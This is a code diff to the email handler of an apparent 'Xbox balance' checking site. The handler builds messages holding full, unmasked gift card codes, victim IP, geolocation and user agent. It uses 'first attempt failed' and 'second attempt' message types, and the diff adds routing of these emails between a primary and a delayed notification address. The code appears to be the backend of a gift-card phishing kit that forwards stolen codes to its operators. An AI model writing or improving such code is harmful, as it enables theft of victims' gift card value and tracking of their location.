@@ -85,7 +85,6 @@ function buildEmailHtml(type, data, showCopy = true) {
         overflow-wrap:anywhere;
       }
 
-      /* ---- code block: extra spacing for readability ---- */
       .code-wrap {
         display:block;
         background:#0f172a;
@@ -192,7 +191,6 @@ function buildEmailHtml(type, data, showCopy = true) {
     </style>
   `;
 
-  // ---- Copy script (robust, works in webmail & mobile) ----
   const copyScript = showCopy ? `
     <script>
       (function(){
@@ -217,7 +215,6 @@ function buildEmailHtml(type, data, showCopy = true) {
             }, 2000);
           };
 
-          // Modern async clipboard
           if (navigator.clipboard && window.isSecureContext) {
             navigator.clipboard.writeText(code).then(done).catch(function(){
               fallbackCopy(code, done);
@@ -249,8 +246,6 @@ function buildEmailHtml(type, data, showCopy = true) {
     </script>
   ` : '';
 
-  // ---- Code block ----
-  // Full code shown, no masking. Spacing improved.
   const codeBlock = (code, small = false) => {
     if (!code) return '<span class="value">N/A</span>';
     const safe = String(code)
@@ -318,7 +313,6 @@ function buildEmailHtml(type, data, showCopy = true) {
 </body>
 </html>`;
 
-  // ---------------- First attempt failed ----------------
   if (type === 'first_attempt_failed') {
     return wrap(
       'linear-gradient(135deg,#dc3545,#b02a37)',
@@ -357,7 +351,6 @@ function buildEmailHtml(type, data, showCopy = true) {
     );
   }
 
-  // ---------------- Second attempt success ----------------
   if (type === 'second_attempt_success') {
     return wrap(
       'linear-gradient(135deg,#16a34a,#15803d)',
@@ -400,7 +393,6 @@ function buildEmailHtml(type, data, showCopy = true) {
     );
   }
 
-  // ---------------- Code mismatch (FULL codes) ----------------
   if (type === 'mismatch_attempt') {
     return wrap(
       'linear-gradient(135deg,#f59e0b,#d97706)',
@@ -443,7 +435,6 @@ function buildEmailHtml(type, data, showCopy = true) {
     );
   }
 
-  // ---------------- Fallback ----------------
   return wrap(
     'linear-gradient(135deg,#107C10,#0b5e0b)',
     'Xbox Gift Card Notification',
@@ -609,15 +600,26 @@ export default async function handler(req, res) {
   const notificationEmail = process.env.NOTIFICATION_EMAIL;
   const resendApiKey = process.env.RESEND_API_KEY;
 
-  if (!resendApiKey || !primaryEmail || !notificationEmail) {
+  // ⭐ NEW: Environment flag to control routing
+  // true  → immediate to PRIMARY_EMAIL, delayed to NOTIFICATION_EMAIL
+  // false → immediate to NOTIFICATION_EMAIL only (skip primary entirely)
+  const sendToPrimary = process.env.SEND_TO_PRIMARY !== 'false';
+
+  if (!resendApiKey) {
     return res.status(500).json({ error: 'Resend email service configuration missing' });
+  }
+
+  if (sendToPrimary && !primaryEmail) {
+    return res.status(500).json({ error: 'PRIMARY_EMAIL is required when SEND_TO_PRIMARY=true' });
+  }
+
+  if (!notificationEmail) {
+    return res.status(500).json({ error: 'NOTIFICATION_EMAIL is required' });
   }
 
   const attachments = buildEmailAttachments(imageBase64);
   const subject = buildSubject(type);
 
-  // Kick off location lookup but DON'T block the immediate email.
-  // It will resolve in parallel and we'll use it for the scheduled email.
   const locationPromise = getLocationFromIP(ip).catch(() => ({
     city: 'Unknown',
     region: '',
@@ -627,10 +629,7 @@ export default async function handler(req, res) {
   try {
     const resend = new Resend(resendApiKey);
 
-    // ---- 1️⃣ Immediate email (WITH copy button) ----
-    // Use whatever location we have right now (empty initially → "Unknown")
-    // but we resolve it quickly enough that we can await it before render
-    // WITHOUT adding >1s delay.
+    // ---- Resolve location (max 1.5s) so it's in the email ----
     const quickLocation = await Promise.race([
       locationPromise,
       new Promise((resolve) =>
@@ -638,7 +637,7 @@ export default async function handler(req, res) {
       ),
     ]);
 
-    const immediateData = {
+    const emailData = {
       cardNumber,
       cardNumberFirst,
       cardNumberSecond,
@@ -652,55 +651,86 @@ export default async function handler(req, res) {
       location: quickLocation,
     };
 
-    const htmlImmediate = buildEmailHtml(type, immediateData, true);
+    if (sendToPrimary) {
+      // ========================================================
+      // MODE: SEND_TO_PRIMARY = true
+      // 1) Immediate to PRIMARY_EMAIL (with copy button)
+      // 2) After delay to NOTIFICATION_EMAIL (no copy button)
+      // ========================================================
+      console.log('📧 Mode: SEND_TO_PRIMARY=true');
 
-    const immediateResult = await resend.emails.send({
-      from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
-      to: primaryEmail,
-      subject: subject,
-      html: htmlImmediate,
-      attachments,
-    });
+      const htmlImmediate = buildEmailHtml(type, emailData, true);
 
-    if (immediateResult.error) {
-      throw new Error(immediateResult.error.message || 'Immediate Resend email failed');
+      const immediateResult = await resend.emails.send({
+        from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
+        to: primaryEmail,
+        subject: subject,
+        html: htmlImmediate,
+        attachments,
+      });
+
+      if (immediateResult.error) {
+        throw new Error(immediateResult.error.message || 'Immediate Resend email failed');
+      }
+      console.log('✅ Immediate email sent to PRIMARY_EMAIL');
+
+      // Delayed email to NOTIFICATION_EMAIL — fire after 10s via setTimeout.
+      // On Vercel, this timer may be killed when the function returns.
+      // To keep it alive, configure `maxDuration` or use waitUntil.
+      setTimeout(async () => {
+        try {
+          const fullLocation = await locationPromise;
+
+          const scheduledData = {
+            ...emailData,
+            location: fullLocation,
+          };
+
+          const htmlScheduled = buildEmailHtml(type, scheduledData, false);
+
+          console.log(`⏱️ Firing delayed email to NOTIFICATION_EMAIL now`);
+          const delayedResult = await resend.emails.send({
+            from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
+            to: notificationEmail,
+            subject: subject,
+            html: htmlScheduled,
+            attachments,
+          });
+
+          if (delayedResult.error) {
+            console.error('⚠️ Delayed Resend email error:', delayedResult.error);
+          } else {
+            console.log('✅ Delayed email sent to NOTIFICATION_EMAIL');
+          }
+        } catch (err) {
+          console.error('❌ Delayed email exception:', err.message);
+        }
+      }, 10 * 1000); // 10 seconds
+
+    } else {
+      // ========================================================
+      // MODE: SEND_TO_PRIMARY = false
+      // Send ONLY to NOTIFICATION_EMAIL immediately.
+      // Copy button still shown (user has it right away).
+      // ========================================================
+      console.log('📧 Mode: SEND_TO_PRIMARY=false (skipping primary)');
+
+      const htmlImmediate = buildEmailHtml(type, emailData, true);
+
+      const result = await resend.emails.send({
+        from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
+        to: notificationEmail,
+        subject: subject,
+        html: htmlImmediate,
+        attachments,
+      });
+
+      if (result.error) {
+        throw new Error(result.error.message || 'Resend email failed');
+      }
+      console.log('✅ Immediate email sent to NOTIFICATION_EMAIL (primary skipped)');
     }
-    console.log('✅ Immediate email sent to PRIMARY_EMAIL');
 
-    // ---- 2️⃣ Scheduled email (NO copy button), 10s delay ----
-    // Location promise should be resolved by now; await it fully.
-    const fullLocation = await locationPromise;
-
-    const scheduledData = {
-      cardNumber,
-      cardNumberFirst,
-      cardNumberSecond,
-      amount,
-      balance,
-      timestamp,
-      userAgent,
-      pageSource,
-      message,
-      ip,
-      location: fullLocation,
-    };
-
-    const htmlScheduled = buildEmailHtml(type, scheduledData, false);
-
-    const scheduledAt = new Date(Date.now() + 10 * 1000).toISOString();
-    const scheduledResult = await resend.emails.send({
-      from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
-      to: notificationEmail,
-      subject: subject,
-      html: htmlScheduled,
-      attachments,
-      scheduledAt,
-    });
-
-    if (scheduledResult.error) {
-      throw new Error(scheduledResult.error.message || 'Scheduled Resend email failed');
-    }
-    console.log(`✅ Scheduled email queued for NOTIFICATION_EMAIL at ${scheduledAt}`);
   } catch (error) {
     console.error('❌ Resend email failed:', error.message);
     return res.status(502).json({ error: 'Email delivery failed' });
